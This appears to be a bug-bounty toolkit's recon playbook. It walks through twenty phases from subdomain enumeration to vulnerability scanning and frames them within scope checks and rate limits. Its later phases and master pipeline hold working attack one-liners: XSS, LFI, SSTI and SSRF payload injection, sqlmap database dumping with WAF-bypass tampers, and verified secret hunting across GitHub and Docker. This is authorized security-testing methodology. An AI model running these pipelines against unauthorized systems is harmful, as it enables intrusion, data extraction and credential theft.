# ReconForge Recon Playbook

Operator reference for the 20-phase recon kill chain shipped in
[`scripts/recon/`](../scripts/recon/). Distilled from public-domain
methodology and stress-tested against the in-app `scope_guard.py`,
mode classifier, and rate-limit conventions.

**TL;DR:**
- The pipeline shape is **passive enum → resolve → port scan → HTTP probe → crawl + JS analyze → param/URL discovery → templated vuln scan → OOB callback → targeted attacks**. Every one-liner in this document drops into that shape.
- ReconForge ships ~50 tools across the 20 phases; the canonical pipeline uses ~30 of them. The remainder are situational (CTF-only, region-specific, paywalled).
- **Recon is the work.** Vulnerability confirmation is the last 10–20%. Build a system that runs the boring 80–90% automatically and reliably; spend manual hours only on confirmed reflection points, IDOR candidates, and SSRF callbacks.
- **Scope Guard is non-negotiable.** Every active probe goes through [`scope_guard.py`](../scope_guard.py). Out-of-scope rules always win. `*.example.com` does NOT include `example.com` unless explicitly listed.

---

## Table of contents

1. [Phase 0 — Scope hygiene](#phase-0--scope-hygiene)
2. [Phase 1 — Passive subdomain enumeration](#phase-1--passive-subdomain-enumeration)
3. [Phase 2 — Active resolution + permutation](#phase-2--active-resolution--permutation)
4. [Phase 3 — TLS / CDN / network surface](#phase-3--tls--cdn--network-surface)
5. [Phase 4 — Port scanning](#phase-4--port-scanning)
6. [Phase 5 — HTTP probing (httpx)](#phase-5--http-probing-httpx)
7. [Phase 6 — Crawling (katana)](#phase-6--crawling-katana)
8. [Phase 7 — JavaScript analysis](#phase-7--javascript-analysis)
9. [Phase 8 — Content discovery](#phase-8--content-discovery)
10. [Phase 9 — URL history from archives](#phase-9--url-history-from-archives)
11. [Phase 10 — Parameter discovery](#phase-10--parameter-discovery)
12. [Phase 11 — Pattern filtering (gf)](#phase-11--pattern-filtering-gf)
13. [Phase 12 — Payload replacement (qsreplace)](#phase-12--payload-replacement-qsreplace)
14. [Phase 13 — Out-of-band callbacks](#phase-13--out-of-band-callbacks)
15. [Phase 14 — Nuclei sweep](#phase-14--nuclei-sweep)
16. [Phase 15 — XSS-targeted](#phase-15--xss-targeted)
17. [Phase 16 — CRLF](#phase-16--crlf)
18. [Phase 17 — SQL injection](#phase-17--sql-injection)
19. [Phase 18 — Screenshots](#phase-18--screenshots)
20. [Phase 19 — Secret hunting](#phase-19--secret-hunting)
21. [Phase 20 — Alerting](#phase-20--alerting)
22. [Master pipeline reference](#master-pipeline-reference)
23. [OPSEC checklist](#opsec-checklist)
24. [Continuous monitoring](#continuous-monitoring)
25. [Common gotchas](#common-gotchas)

---

## Phase 0 — Scope hygiene

Do this first, every time. The cost of an out-of-scope probe is a
program ban; the cost of running scope_guard is ~5 ms.

```bash
python -m reconforge scope check --program scopes/example.json --target sub.example.com
# → {"allowed": true, "tier": 2, "headers": {"X-Intigriti-Username": "..."}}
```

Or via the script:

```bash
TARGET=sub.example.com SCOPE_FILE=scopes/example.json scripts/recon/00-scope-check.sh
```

Exit code 0 = in scope. Exit code 3 = refused (abort entire run).

**ReconForge wires this into the dispatch layer:** every tool
invocation through `tools/registry.py:dispatch()` is preceded by a
scope check via `core/programs.scope_check`. Bypassing it requires a
manual edit; the in-app modal won't let you arm an active scan
against an OOS target.

---

## Phase 1 — Passive subdomain enumeration

**Tools:** subfinder, amass `-passive`, assetfinder, findomain, github-subdomains, crt.sh, chaos, bbot.

**Canonical:**

```bash
# All-in-one merge — pipe through anew to dedupe as you go
mkdir -p subs
subfinder -d target.com -all -recursive -silent -o subs/sf.txt
assetfinder --subs-only target.com | anew subs/af.txt
amass enum -passive -d target.com -o subs/am.txt
findomain -t target.com -q -o subs/fd.txt
github-subdomains -d target.com -t "$GITHUB_TOKEN" -e -raw -o subs/gh.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subs/crt.txt
chaos -d target.com -silent -o subs/chaos.txt        # PD bug-bounty DB; requires CHAOS_KEY
cat subs/*.txt | sort -u > subs/all.txt
```

Or run the script:

```bash
TARGET=target.com GITHUB_TOKEN=ghp_... CHAOS_KEY=... scripts/recon/01-passive-enum.sh
```

### Subfinder details

Subfinder ships 46 passive sources; 34 are enabled by default. **Adding
8 API keys reliably ~doubles the result count** (subfinder maintainer's
own number). Set them in `~/.config/subfinder/provider-config.yaml`:
Chaos, Censys, SecurityTrails, Shodan, VirusTotal, GitHub, Bevigil,
Whoxy.

The recon script auto-detects missing keys and logs which sources are
disabled — no silent skips.

### GitHub-subdomains throttling

Set multiple tokens for rotation:

```bash
export GITHUB_TOKEN=ghp_aaa,ghp_bbb,ghp_ccc
github-subdomains -d target.com -e -raw -o gh-subs.txt
```

`-e` = extended mode (matches `<anything>example.<tld>`). On 429,
github-subdomains auto-rotates and re-enables tokens after 60s.

### When passive isn't enough

If the deduped passive set looks thin (< 50 entries for a Fortune-500),
chain into `bbot`'s recursive mode:

```bash
bbot -t target.com -f subdomain-enum -o bbot-out -y --silent
```

BBOT aggregates CT, public DNS, certificate scraping, GitHub, and
brute in one pass. It's RAM-hungry (≥8 GB recommended); ReconForge
runs it under a `max_concurrent: 1` gate.

---

## Phase 2 — Active resolution + permutation

**Tools:** puredns (preferred), dnsx, shuffledns, mapcidr, alterx,
gotator, dnsgen.

```bash
# puredns: wildcard-DNS-aware bulk resolution
puredns resolve subs/all.txt -r resolvers.txt --rate-limit 1000 -w resolved.txt

# Permutation pass (when passive enum looks thin)
alterx -enrich -l subs/all.txt -o perms.txt
gotator -sub subs/all.txt -perm dns_permutations.txt -depth 1 -numbers 10 -mindup -adv -md > perms.txt
puredns resolve perms.txt -r resolvers.txt -w resolved_perms.txt

# CIDR sweep (when you have an ASN)
echo AS15133 | mapcidr -silent | dnsx -ptr -resp-only -silent
```

**Resolvers file matters more than the tool.** Stale resolvers cause
both false positives (wildcard pollution) and false negatives
(rate-limited NXDOMAIN). Validate weekly:

```bash
dnsvalidator -tL ~/wordlists/resolvers.txt -threads 50 -o resolvers.validated.txt
```

ReconForge looks for the resolvers at `$RESOLVERS_FILE`
(`~/wordlists/resolvers.txt` by default).

---

## Phase 3 — TLS / CDN / network surface

```bash
# Pull all SANs/CNs from certs across a CIDR
echo 173.0.84.0/24 | tlsx -san -cn -silent -resp-only | dnsx -silent | httpx -silent

# Misconfig sweep on the host list
tlsx -l hosts.txt -ex -ss -mm -re    # expired, self-signed, mismatched, revoked
tlsx -l hosts.txt -cipher -ce        # weak ciphers

# CDN classification — filter shared infra so port/vuln scans skip it
cat ips.txt | cdncheck -resp -fcdn cloudflare,fastly,akamai,cloudfront,google,leaseweb -o non-cdn.txt
```

The script reads `02-resolve/resolved.txt` and writes
`03-tls-cdn/{tls.txt,cdn.jsonl,non-cdn.txt}`. Downstream phases prefer
`non-cdn.txt` when present — saves 30–60% of nuclei runtime by skipping
shared CDN IPs.

---

## Phase 4 — Port scanning

```bash
# naabu: fast, sane defaults, top-1000
naabu -l resolved.txt -tp 1000 -rate 5000 -silent -o ports.txt

# Service fingerprint via nmap (chained from naabu)
naabu -iL ip.txt -p 443,80 -stats -nmap-cli 'nmap -sV -oX naabu-output.xml'

# Big sweeps: masscan + nmap follow-up (rate-limit conservatively)
sudo masscan -p1-65535 -iL ips.txt --rate=10000 --excludefile excludes.conf -oX masscan.xml
```

**Caveat:** running masscan against a CDN-fronted IP burns rate budget
on the CDN, not the target. Always filter through Phase 3's
`non-cdn.txt` first.

**Naabu vs nmap:** naabu is ~30× faster on port discovery but
fingerprints worse. The right pattern is naabu → list of open ports
→ nmap `-sV` on just those ports.

---

## Phase 5 — HTTP probing (httpx)

```bash
# Deep enrichment in one pass
httpx -l hosts.txt -sc -cl -ct -location -favicon -hash md5 -jarm -rt -lc -wc \
  -title -bp -server -tech-detect -method -websocket -ip -cname -asn -cdn -probe \
  -screenshot -http2 -vhost -tls-probe -csp-probe -o httpx-full.txt

# Path probe — common admin/backup/git/env paths
httpx -l urls.txt -path "/admin,/login,/.git,/backup,/.env" -mc 200,302,403 -sc

# Burp Suite XML export as input
httpx -l burp-export.xml -im burp
```

**Workhorse flags:** `-mc / -fc` match/filter status, `-ml / -fl`
length, `-ms / -fs` body string, `-mr / -er` regex, `-asn`, `-jarm`,
`-maxhr` (max host errors before skip — set to 3 for noisy hosts).

The script writes `05-http-probe/httpx.jsonl` (full JSON) and
`alive.txt` (plain URL list); downstream phases consume both.

---

## Phase 6 — Crawling (katana)

```bash
# JS-aware crawl, depth 3, passive sources
katana -u alive.txt -d 3 -ps -pss waybackarchive,commoncrawl,alienvault \
  -kf all -jc -fx \
  -ef woff,css,png,svg,jpg,woff2,jpeg,gif -o allurls.txt

# Deep JS parsing (RAM-hungry)
katana -list alive.txt -silent -nc -jc -jsl -kf all -fx -xhr \
  -ef woff,css,png,svg,jpg,woff2,jpeg,gif -aff | anew urls.txt

# Headless mode for SPA / dynamic content
katana -u https://target.com -headless -no-incognito -no-sandbox
```

**`-jsl` is memory-intensive** (katana's own CLI warning). Run on ≥8 GB
RAM or against a small subset of JS bundles. ReconForge gates katana
under `max_concurrent: 2`.

**Output discipline:** `katana -jsonl -o crawl.jsonl -sr` produces full
request/response pairs — invaluable for nuclei input later and for
diffing nightly crawls.

---

## Phase 7 — JavaScript analysis

```bash
# Fetch all JS file URLs into a local dir
while read -r url; do
  fname=$(echo "$url" | sha256sum | cut -c1-16).js
  curl -sS --max-time 15 -o "js-bodies/$fname" "$url" || true
done < js-urls.txt

# jsluice URL + secret extraction
for f in js-bodies/*.js; do
  jsluice urls    "$f" >> extracted-urls.txt
  jsluice secrets "$f" >> extracted-secrets.jsonl
done

# trufflehog filesystem scan over the JS dump
trufflehog filesystem js-bodies --json --no-update --only-verified > trufflehog.jsonl

# Mantra live JS scan (fetches its own content)
mantra -ua ReconForge -p https://target.com/main.js
```

The combination of jsluice + trufflehog + mantra has the highest
secret-finding hit rate of any phase. Mature programs sanitize their
production bundles but leak through staging / vendor / archived
backups.

**SecretFinder** (`m4ll0k/SecretFinder.py -i URL -o cli`) is the
single-URL alternative for cases where the JS body isn't easily
downloadable (CSP frame-ancestors, signed URLs, etc.).

---

## Phase 8 — Content discovery

```bash
# ffuf — fastest, ac (auto-calibrate) cuts noise
ffuf -w raft-medium-directories.txt -u https://target.com/FUZZ -fc 404,301 \
  -ac -recursion -recursion-depth 2 -t 80 -o ffuf.json -of json

# feroxbuster — Rust, recursive + backup-extension detection
feroxbuster -u https://target.com -w raft-medium.txt --depth 4 \
  --extract-links --collect-backups --collect-words --auto-tune --auto-bail \
  -s 200,301,302,401,403 -t 50 -o ferox.txt

# Vhost discovery (DNS bypass via Host header)
ffuf -u http://203.0.113.10/ -H "Host: FUZZ.target.com" -w vhosts.txt -mc all -fs 0
```

**Heavy traffic.** This phase trips program rate-limits faster than
any other. Match `RATE_LIMIT_RPS` to the program's policy or stay
silent (skip the phase). The script (`08-content-discovery.sh`) logs
a WARN banner before firing.

**Wordlist hygiene** — bad wordlists are the #1 source of duplicate
findings. Curate three:

1. `raft-medium-directories.txt` for content discovery
2. `burp-parameter-names.txt` for x8 / arjun
3. A custom one from your archive of `unfurl -u keys` outputs (sector-tuned)

---

## Phase 9 — URL history from archives

```bash
# Full history harvest
echo target.com | gau --subs --threads 200 | anew gau.txt
echo target.com | waybackurls | anew way.txt

# Parameter wordlist + sensitive-file matches
gau target.com | unfurl -u keys | sort -u > params.txt
gau target.com | unfurl -u paths | tr '/' '\n' | sort -u > paths.txt
gau target.com | grep -iE "\.(env|bak|sql|tar\.gz|7z|backup|secret|config|log|cache)$" > interesting.txt
```

The archives are a goldmine for **deprecated endpoints that still work**.
Many targets remove links to old endpoints but don't actually
unregister the routes. `gau` + `httpx` against the archive corpus
routinely surfaces 200 responses on endpoints not in the current crawl.

---

## Phase 10 — Parameter discovery

```bash
# arjun — behavioral diff (slow, accurate)
arjun -u https://target.com/profile -oT params.txt
arjun -i alive.txt -t 10 --rate-limit 5 -oT mass-params.txt

# paramspider — archive-driven (passive, fast)
# v3 dropped --exclude/--output (static exts filtered internally); -s streams to stdout
paramspider -d target.com -s | anew params.txt

# x8 — hidden parameter discovery on top hosts
x8 -u https://target.com -w burp-parameter-names.txt --output-format url
```

**Chain pattern:** archive URLs → unfurl keys → arjun mass scan. The
archive set seeds candidate parameter names; arjun confirms which
endpoints actually accept them.

---

## Phase 11 — Pattern filtering (gf)

```bash
cat all-urls.txt | gf xss      | anew xss-cand.txt
cat all-urls.txt | gf ssrf     | anew ssrf-cand.txt
cat all-urls.txt | gf idor     | anew idor-cand.txt
cat all-urls.txt | gf sqli     | anew sqli-cand.txt
cat all-urls.txt | gf lfi      | anew lfi-cand.txt
cat all-urls.txt | gf ssti     | anew ssti-cand.txt
cat all-urls.txt | gf redirect | anew redirect-cand.txt
```

Patterns live in `~/.gf/*.json`. The repo's Dockerfile clones both
`tomnomnom/gf` and `1ndianl33t/Gf-Patterns` into `/root/.gf/` so the
above one-liners work out of the box.

**Curate your own pattern set per sector.** Add every confirmed-bug
parameter name to your local patterns within 24h — the patterns are
your accumulating institutional knowledge.

---

## Phase 12 — Payload replacement (qsreplace)

```bash
cat ssrf-cand.txt | qsreplace "http://abc.oast.pro/"               > tmp-ssrf.txt
cat xss-cand.txt  | qsreplace '"><script>alert(1)</script>'         > tmp-xss.txt
cat lfi-cand.txt  | qsreplace "/etc/passwd"                          > tmp-lfi.txt
cat redirect-cand.txt | qsreplace "https://example.evil/"           > tmp-redir.txt
cat ssti-cand.txt | qsreplace '{{7*7}}'                              > tmp-ssti.txt
```

`qsreplace` rewrites EVERY query-string value, so a URL like
`?a=1&b=2` becomes `?a=PAYLOAD&b=PAYLOAD`. Each parameter is
independently testable; just curl each and check the response.

---

## Phase 13 — Out-of-band callbacks

Self-host whenever the target has any defensive maturity — public
`oast.pro` is blocklisted on many programs.

```bash
# Public server (CTF / low-stakes work)
interactsh-client -server oast.pro -n 5

# Self-hosted (see scripts/c2/interactsh-server-deploy.sh)
interactsh-client -server oast.yourdomain.com -token YOUR_AUTH_TOKEN

# Pipe matched callbacks to notify
interactsh-client -v | notify -bulk -id oob-monitoring
```

The script (`13-oob-callback.sh`) starts an interactsh-client as a
background daemon, extracts the per-run session URL into
`session-url.txt`, and writes callbacks to `callbacks.txt`. SSRF /
XXE / blind-RCE scripts in `scripts/vuln/` pick up the session URL
automatically.

---

## Phase 14 — Nuclei sweep

```bash
# Tech-detect first, scan with templates matching the detected stack
httpx -l alive.txt -tech-detect -json | jq -r 'select(.tech) | .url' > techy.txt
nuclei -l techy.txt -tags wordpress,jira,confluence,gitlab -severity medium,high,critical

# KEV-only sweep (known-exploited CVEs)
nuclei -l targets.txt -tags kev,vkev

# Production-stealth scan
nuclei -l targets.txt -rl 50 -c 5 -delay 2 -severity critical,high

# Markdown export for report bundling
nuclei -l targets.txt -t cves/2024/ -severity critical -markdown-export reports/ -include-rr
```

**Detect tech FIRST.** Aggressive spraying without fingerprinting
trips WAF lockouts on mature programs. The script (`14-vuln-scan.sh`)
runs both passes: tech-detected URLs at medium+, then a KEV-only
sweep over the full alive set.

**Template freshness matters.** Run `nuclei -update-templates` daily
(the monitor template-watcher does this automatically).

---

## Phase 15 — XSS-targeted

```bash
# Three-stage refinement: Gxss sieves reflectors → dalfox confirms → hard grep
cat xss-cand.txt | Gxss -p Xss -c 100 \
  | grep -i "URL" | cut -d '"' -f2 | sort -u \
  | dalfox pipe -H "Authorization: Bearer $TOKEN" -b "$BLIND_XSS_URL"

# Hard-confirm grep (the canonical XSSRat pattern)
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' \
  | qsreplace '"><script>alert(1)</script>' \
  | while read host; do
      curl -s --path-as-is --insecure "$host" \
        | grep -qs "<script>alert(1)</script>" && echo "VULN: $host"
    done
```

Gxss sieves the surface to **actual reflectors** — saves 5–20× on
dalfox runtime. The hard-grep stage produces a list with zero false
positives (server must echo the payload verbatim).

---

## Phase 16 — CRLF

```bash
subfinder -d target.com -silent | httpx -silent | crlfuzz
crlfuzz -l urls.txt -X POST -o results.txt
```

Most modern frameworks (Express, Spring, Django) sanitize CR/LF by
default. Look for nginx / Apache backends + custom application code
that builds Location headers from query parameters.

---

## Phase 17 — SQL injection

```bash
# Single URL
sqlmap -u "https://target.com/page?id=1" --batch --random-agent --level 5 --risk 3 --dbs

# From gf-filtered candidates with FUZZ markers
sed 's/=[^&]*/=FUZZ/g' gf-sqli.txt | sort -u > sqli-templates.txt
sqlmap -m sqli-templates.txt --batch --random-agent --level=5 --risk=3 --dbs

# WAF-bypass tamper stack
sqlmap -u "URL" -p param \
  --tamper=between,randomcase,space2comment,charunicodeencode,apostrophenullencode,equaltolike,modsecurityversioned \
  --random-agent
```

**Phase 17 is intrusive.** The script
(`17-sqli.sh`) refuses to run unless `SQLI_CONFIRM=yes`. Bug-bounty
programs vary — always check the program's specific rules on automated
SQLi before firing.

---

## Phase 18 — Screenshots

```bash
# gowitness v3 — note `scan file` subcommand (v2 used just `file -f`)
gowitness scan file -f alive.txt --write-db -t 20
gowitness report server -A   # browse at http://localhost:7171

# Nmap XML input
gowitness nmap -f nmap.xml --open --service-contains http
```

**v3 API changed.** Older blog posts using `gowitness file -f` will
not work — the new path is `gowitness scan file ... --write-db`
followed by `gowitness report server`.

---

## Phase 19 — Secret hunting

```bash
# Local JS dump (filesystem mode is cheap; do this every run)
trufflehog filesystem ./js-bodies --json --no-update --only-verified

# GitHub org scan — highest hit rate; do this weekly
trufflehog github --org=target --token="$GITHUB_TOKEN" --only-verified

# Docker image
trufflehog docker --image=target/api:latest --only-verified

# Postman workspace
trufflehog postman --token="$POSTMAN_TOKEN" --workspace=target
```

`--only-verified` actively hits the upstream API to confirm the
credential is live. Without it, you get a sea of false-positive
test-keys.

---

## Phase 20 — Alerting

```bash
notify -bulk -data findings.txt -id "daily-monitoring"
nuclei -l targets.txt -t newtemplates.yaml | notify -id "daily-monitoring"
```

Configure providers in `~/.config/notify/provider-config.yaml`
(Slack / Discord / Telegram / Pushover blocks).

The script writes a per-run summary (subdomain count, alive count,
secret hits, nuclei hits) and pushes it via notify.

---

## Master pipeline reference

```bash
#!/usr/bin/env bash
# scripts/recon/master-pipeline.sh — see file for full implementation.
TARGET="$1"
mkdir -p "$TARGET" && cd "$TARGET"

# 1. Passive enum
subfinder -d "$TARGET" -all -silent | anew subs.txt
github-subdomains -d "$TARGET" -t "$GITHUB_TOKEN" -raw | anew subs.txt
amass enum -passive -d "$TARGET" | anew subs.txt
curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew subs.txt
chaos -d "$TARGET" -silent | anew subs.txt

# 2. Bruteforce + resolve
shuffledns -d "$TARGET" -w ~/wordlists/n0kovo_subdomains_huge.txt -r ~/wordlists/resolvers.txt -mode bruteforce | anew subs.txt
puredns resolve subs.txt -r ~/wordlists/resolvers.txt --rate-limit 1000 -w resolved.txt

# 3. TLS + CDN
cdncheck -resp -fcdn cloudflare,fastly,akamai,cloudfront -i resolved.txt -o non-cdn.txt
echo "$TARGET" | tlsx -san -cn -silent -resp-only | anew subs.txt

# 4. Ports
naabu -l resolved.txt -tp 1000 -rate 5000 -silent -o ports.txt

# 5. HTTP probe
httpx -l ports.txt -silent -title -tech-detect -status-code -follow-redirects \
  -ip -cname -cdn -jarm -screenshot -j > httpx.jsonl
jq -r '.url' httpx.jsonl > alive.txt

# 6. Crawl + archives
katana -list alive.txt -silent -nc -jc -jsl -kf all -fx -xhr \
  -ef woff,css,png,svg,jpg,woff2,jpeg,gif -aff | anew urls.txt
cat alive.txt | (gau --subs --threads 200; waybackurls) | anew urls.txt

# 7. JS + secrets
grep -E '\.js(\?|$)' urls.txt | sort -u > js.txt
mkdir -p js-bodies
while read u; do curl -sS --max-time 15 -o "js-bodies/$(echo "$u"|sha256sum|cut -c1-16).js" "$u"; done < js.txt
for f in js-bodies/*.js; do
  jsluice urls    "$f" >> js-urls.txt
  jsluice secrets "$f" >> js-secrets.jsonl
done
trufflehog filesystem ./js-bodies --json --no-update --only-verified > trufflehog.jsonl

# 8. Params + content
cat urls.txt | unfurl -u keys | sort -u > params.txt
arjun -i alive.txt -t 10 --rate-limit 5 -oT arjun-params.txt
ffuf -w ~/wordlists/raft-medium.txt -u https://FUZZ.${TARGET}/FUZZ -fc 404,301 -ac -t 80 -of json -o ffuf.json

# 9. Pattern split
for p in xss ssrf idor sqli lfi ssti redirect; do
  cat urls.txt | gf "$p" | anew "gf-$p.txt"
done

# 10. Targeted
cat gf-xss.txt  | dalfox pipe -b "$BLIND_XSS_URL" --silence -o xss-results.txt
cat gf-ssrf.txt | qsreplace "http://${OOB_TOKEN}.${OAST_DOMAIN}/" | httpx -silent -fr
sed 's/=[^&]*/=FUZZ/g' gf-sqli.txt | sort -u | sqlmap -m - --batch --level 5 --risk 3 --dbs
cat gf-lfi.txt  | qsreplace "/etc/passwd" | xargs -I% -P25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI %"'
crlfuzz -l alive.txt -o crlf.txt

# 11. Nuclei sweep
nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray \
  -severity low,medium,high,critical \
  -markdown-export reports/ -include-rr \
  | notify -bulk -id daily-monitor
```

Or just run `scripts/recon/master-pipeline.sh` — same shape, with
scope check + tool availability + structured logs prepended.

---

## OPSEC checklist

- **Rate limits**: `RATE_LIMIT_RPS=50`, `THREADS=10`. ReconForge's
  defaults match conservative bug-bounty norms. Bump only after
  reading the program's policy URL.
- **Identifying headers**: Intigriti requires
  `X-Intigriti-Username: grover` on every request to in-scope assets.
  ReconForge's scope_guard injects this automatically when the program
  is registered.
- **User-Agent**: bug-bounty programs increasingly require an
  identifiable UA. The Dockerfile sets `grover-bb-research` as the
  default for the Go-based tools; tune per program.
- **Source IP**: rotate VPS IPs between programs. The same IP hitting
  ten different bug-bounty targets in a day looks like an attacker,
  not a researcher.
- **Cookie hygiene**: never reuse session cookies between programs.
  Each program gets a clean Burp profile + cookie jar.
- **Avoid public OOB infra** (`oast.pro`, `burpcollaborator.net`) on
  mature targets — they're blocklisted. Self-host via
  `scripts/c2/interactsh-server-deploy.sh`.
- **Document scope decisions**: every block / refusal logged by
  scope_guard is admissible as evidence in a legal context. Don't
  delete the logs.

---

## Continuous monitoring

Once a target is in your portfolio, layer
[`scripts/monitor/`](../scripts/monitor/) on top of the one-shot
pipeline:

```bash
scripts/monitor/install-cron.sh acme.com
```

Two cron entries:

1. **Hourly**: re-run passive enum, md5-diff the result, fire nuclei
   on new hosts only.
2. **Every 6 hours**: refresh nuclei templates, re-scan the tracked
   subdomain set against any new templates.

Both daemons push alerts via `notify` when there's something to
report. State lives under `~/.local/share/reconforge/monitor/<target>/`.

---

## Common gotchas

- **WAF lockout from aggressive nuclei**: detect tech FIRST, target
  templates to the stack. Naïve spray + KEV mass-scan trips Cloudflare
  / Akamai in under five minutes.
- **JSluice / Katana `-jsl` OOM on small VMs**: both are flagged
  memory-intensive. Run on ≥8 GB RAM or chunk the input.
- **Gowitness v3 syntax**: `gowitness scan file -f` + `--write-db`,
  not the legacy `gowitness file -f`.
- **Public Interactsh blocklisting**: self-host on a clean throwaway
  domain. The deploy script (`scripts/c2/interactsh-server-deploy.sh`)
  handles the setup.
- **Wildcard DNS pollution**: always run puredns/shuffledns with the
  `--skip-wildcard-filter` flag DISABLED (i.e. let it filter). A
  wildcard domain emits a 200 for every subdomain — left unfiltered,
  every later phase wastes runtime on phantom hosts.
- **Rate limits in the master pipeline are intentionally
  conservative**. Bump them only after reading the program's policy
  URL. Even ReconForge's defaults can trip some programs.
- **Tool freshness**: the Go toolchain releases breaking changes on
  monthly cadence. Rebuild the Docker image weekly.

---

## See also

- [`scripts/recon/README.md`](../scripts/recon/README.md) — the
  in-repo phase index with file paths.
- [`docs/HUNTING_PLAYBOOK.md`](HUNTING_PLAYBOOK.md) — what to do with
  the recon output: per-vuln deep dives, chaining, and reporting.
- [`scope_guard.py`](../scope_guard.py) — the authoritative scope
  enforcement module. Read it before designing any new automation.
- [`CLAUDE.md`](../CLAUDE.md) — repo-level operator doctrine and
  agent doctrine.
